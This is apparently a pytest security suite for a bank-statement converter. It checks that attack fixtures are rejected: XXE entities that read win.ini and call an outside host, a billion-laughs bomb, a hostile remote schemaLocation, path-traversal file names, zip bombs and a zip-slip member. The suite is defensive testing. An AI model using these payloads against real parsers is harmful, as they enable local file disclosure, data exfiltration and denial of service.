"""P1-M7 security suite: S01-S08 attack fixtures and SEC requirement tests.

The whole module runs under the socket-blocking harness in conftest.py, so every
conversion here doubles as an offline-operation proof (SEC-01/02).
"""

import logging
import zipfile
from datetime import datetime
from io import BytesIO
from pathlib import Path

import pytest

from bfs_core.convert import ConversionInput, convert, read_input
from bfs_core.errors import (
    E_INPUT_TOO_LARGE,
    E_XLSX_UNSAFE_ARCHIVE,
    E_XML_DTD_FORBIDDEN,
    BfsError,
)
from bfs_core.model import DiagnosticReport
from bfs_core.security import (
    check_zip_safety,
    create_temp_file,
    mask_value,
    resolve_inside,
    sanitize_filename,
    secure_delete,
    sweep_leftovers,
)
from bfs_core.security.limits import Limits

pytestmark = pytest.mark.security

ROOT = Path(__file__).resolve().parents[2]
FIXTURES = ROOT / "tests" / "fixtures"
CLOCK = datetime(2026, 1, 15, 10, 30)
CAMT_NS = "urn:iso:std:iso:20022:tech:xsd:camt.053.001.02"


class TestS01S02Xxe:
    def test_s01_external_entity_rejected(self):
        doc = (f'<?xml version="1.0"?>'
               f'<!DOCTYPE Document [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">'
               f'<!ENTITY url SYSTEM "http://198.51.100.1/steal">]>'
               f'<Document xmlns="{CAMT_NS}"><BkToCstmrStmt>&xxe;&url;</BkToCstmrStmt>'
               f"</Document>").encode()
        with pytest.raises(BfsError) as e:
            read_input("camt.053.001.02", ConversionInput(data=doc))
        assert e.value.code == E_XML_DTD_FORBIDDEN

    def test_s02_billion_laughs_rejected(self):
        entities = ['<!ENTITY a0 "lol">']
        for i in range(1, 10):
            entities.append(f'<!ENTITY a{i} "{"&a%d;" % (i - 1) * 10}">')
        doc = (f'<?xml version="1.0"?><!DOCTYPE Document [{"".join(entities)}]>'
               f'<Document xmlns="{CAMT_NS}"><BkToCstmrStmt>&a9;</BkToCstmrStmt>'
               f"</Document>").encode()
        with pytest.raises(BfsError) as e:
            read_input("camt.053.001.02", ConversionInput(data=doc))
        assert e.value.code == E_XML_DTD_FORBIDDEN


class TestS03SchemaLocation:
    def test_s03_schema_location_hint_ignored(self):
        # A schema-valid document with a hostile xsi:schemaLocation: must validate
        # against the BUNDLED schema only; the socket harness proves no fetch.
        base = (FIXTURES / "camt053" / "C12.xml").read_bytes()
        hostile = base.replace(
            b"<Document",
            b'<Document xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            b'xsi:schemaLocation="' + CAMT_NS.encode() + b' http://198.51.100.1/evil.xsd"',
            1)
        statements, report = read_input("camt.053.001.02", ConversionInput(data=hostile))
        assert statements and not report.has_errors


class TestS04Paths:
    @pytest.mark.parametrize("hostile", [
        "..\\..\\evil", "../../../etc/passwd", "CON", "PRN.txt", "NUL.csv",
        "report<>:\"|?*.csv", "trailing. ", "nul", "com1.xml", "a\x00b",
    ])
    def test_s04_hostile_names_sanitized(self, hostile):
        report = DiagnosticReport()
        cleaned = sanitize_filename(hostile, report)
        assert "/" not in cleaned and "\\" not in cleaned
        assert ".." not in cleaned
        assert cleaned.split(".")[0].upper() not in {"CON", "PRN", "AUX", "NUL", "COM1"}
        assert not cleaned.endswith((" ", "."))
        assert cleaned

    def test_s04_containment(self, tmp_path):
        assert resolve_inside(tmp_path, "ok.csv").parent == tmp_path.resolve()
        with pytest.raises(BfsError):
            resolve_inside(tmp_path, "..\\escape.csv")


class TestS05ZipSafety:
    def test_s05_zip_bomb_rejected(self):
        bomb = BytesIO()
        with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("xl/huge.xml", b"\x00" * 50_000_000)
        with pytest.raises(BfsError) as e:
            check_zip_safety(bomb.getvalue(), Limits(max_xlsx_uncompressed=10_000_000))
        assert e.value.code == E_XLSX_UNSAFE_ARCHIVE

    def test_s05_ratio_bomb_rejected(self):
        bomb = BytesIO()
        with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("a.xml", b"A" * 10_000_000)  # compresses ~1000:1
        with pytest.raises(BfsError):
            check_zip_safety(bomb.getvalue())

    def test_s05_traversal_member_rejected(self):
        evil = BytesIO()
        with zipfile.ZipFile(evil, "w") as z:
            z.writestr("../../outside.xml", b"x")
        with pytest.raises(BfsError) as e:
            check_zip_safety(evil.getvalue())
        assert "traversal" in str(e.value)

    def test_s05_normal_xlsx_passes(self):
        from bfs_core.xlsx import write_xlsx
        statements, _ = read_input(
            "mt940", ConversionInput(data=(FIXTURES / "mt940" / "M01.sta").read_bytes()))
        payload, _ = write_xlsx(statements)
        check_zip_safety(payload)  # must not raise


class TestS07Limits:
    def test_s07_oversized_file_rejected(self):
        limits = Limits(max_input_bytes=1000)
        with pytest.raises(BfsError) as e:
            read_input("mt940", ConversionInput(data=b":20:X\n" + b"A" * 2000))
            # limits must actually be passed through:
        with pytest.raises(BfsError) as e:
            from bfs_core.mt940 import read_mt940
            read_mt940(b":20:X\n" + b"A" * 2000, limits)
        assert e.value.code == E_INPUT_TOO_LARGE

    def test_s07_megabyte_86_line_rejected(self):
        from bfs_core.mt940 import read_mt940
        huge = (b":20:S\n:25:X\n:28C:1\n:60F:C260102EUR1,00\n"
                b":61:2601030103C1,00NTRFNONREF\n:86:" + b"A" * 40_000
                + b"\n:62F:C260103EUR2,00\n")
        with pytest.raises(BfsError) as e:
            read_mt940(huge)
        assert e.value.code == E_INPUT_TOO_LARGE

    def test_s07_truncated_inputs_controlled(self):
        from bfs_core.mt940 import read_mt940
        for cut in (10, 25, 40, 60):
            data = (FIXTURES / "mt940" / "M01.sta").read_bytes()[:cut]
            try:
                read_mt940(data)
            except BfsError:
                pass  # controlled, typed error — acceptable


class TestS08Fuzz:
    def test_s08_deterministic_mutation_corpus_never_crashes(self):
        import random
        rng = random.Random(1337)
        seeds = [(FIXTURES / "mt940" / "M06.sta").read_bytes(),
                 (FIXTURES / "mt940" / "M01.sta").read_bytes(),
                 (FIXTURES / "camt053" / "C05.xml").read_bytes(),
                 (FIXTURES / "camt053" / "C01.xml").read_bytes()]
        for case in range(120):
            seed = bytearray(seeds[case % len(seeds)])
            for _ in range(rng.randint(1, 8)):
                op = rng.random()
                if op < 0.4 and seed:
                    seed[rng.randrange(len(seed))] ^= 1 << rng.randrange(8)
                elif op < 0.7:
                    seed = seed[:rng.randrange(max(len(seed), 1))]
                else:
                    i, j = sorted((rng.randrange(max(len(seed), 1)),
                                   rng.randrange(max(len(seed), 1))))
                    seed = seed[:i] + seed[j:]
            fmt = "mt940" if case % len(seeds) < 2 else "camt.053.001.02"
            try:
                read_input(fmt, ConversionInput(data=bytes(seed)))
            except BfsError:
                pass  # typed, controlled
            # any other exception type crashes the test — that is the assertion


class TestTempFiles:
    def test_sec07_lifecycle_and_sweep(self):
        path = create_temp_file(".probe")
        assert path.exists()
        path.write_bytes(b"sensitive")
        secure_delete(path)
        assert not path.exists()
        leftover = create_temp_file(".probe")
        assert sweep_leftovers() >= 1
        assert not leftover.exists()


class TestRedaction:
    def test_sec11_iban_masking(self):
        masked = mask_value("failed at DE75512108001245126199 amount 12")
        assert "DE75512108001245126199" not in masked
        assert masked.startswith("failed at DE75…6199")

    def test_sec10_no_pii_in_default_logs(self, caplog):
        # Even with root logging forced to DEBUG (worst case), no raw statement
        # values may reach the log: bfs_core logs positions only, and the mt940
        # library's raw parse tracing is capped unless explicitly opted in.
        with caplog.at_level(logging.DEBUG):
            data = (FIXTURES / "mt940" / "M15.sta").read_bytes()
            convert("mt940", "camt.053.001.02", ConversionInput(data=data), CLOCK)
        joined = " ".join(r.getMessage() for r in caplog.records)
        assert "NL91ABNA0417164300" not in joined
        assert "Jane Example" not in joined

    def test_sec11_verbose_tracing_is_explicit_opt_in(self):
        import logging as _logging

        from bfs_core.mt940.reader import enable_verbose_parse_tracing
        assert _logging.getLogger("mt940").level == _logging.WARNING
        enable_verbose_parse_tracing()
        assert _logging.getLogger("mt940").level == _logging.DEBUG
        _logging.getLogger("mt940").setLevel(_logging.WARNING)


class TestOfflineConversionBattery:
    """SEC-01/02: the full conversion matrix under the socket-blocking harness."""

    @pytest.mark.parametrize("mid", ["M01", "M02", "M12", "M13", "M14", "M15", "M17"])
    @pytest.mark.parametrize("target", ["camt.053.001.02", "camt.053.001.08", "csv", "xlsx"])
    def test_mt940_conversions_offline(self, mid, target):
        data = (FIXTURES / "mt940" / f"{mid}.sta").read_bytes()
        result = convert("mt940", target, ConversionInput(data=data), CLOCK)
        assert result.conservation_verified

    @pytest.mark.parametrize("cid", ["C01", "C02", "C03", "C04", "C07", "C08", "C12"])
    @pytest.mark.parametrize("target", ["mt940", "csv"])
    def test_camt_conversions_offline(self, cid, target):
        data = (FIXTURES / "camt053" / f"{cid}.xml").read_bytes()
        result = convert("camt.053.001.02", target, ConversionInput(data=data), CLOCK)
        assert result.conservation_verified

    def test_no_stray_files_written(self, tmp_path, monkeypatch):
        # SEC-06: a conversion run creates no files anywhere (pure in-memory).
        monkeypatch.chdir(tmp_path)
        data = (FIXTURES / "mt940" / "M01.sta").read_bytes()
        convert("mt940", "camt.053.001.02", ConversionInput(data=data), CLOCK)
        convert("mt940", "csv", ConversionInput(data=data), CLOCK)
        assert list(tmp_path.iterdir()) == []
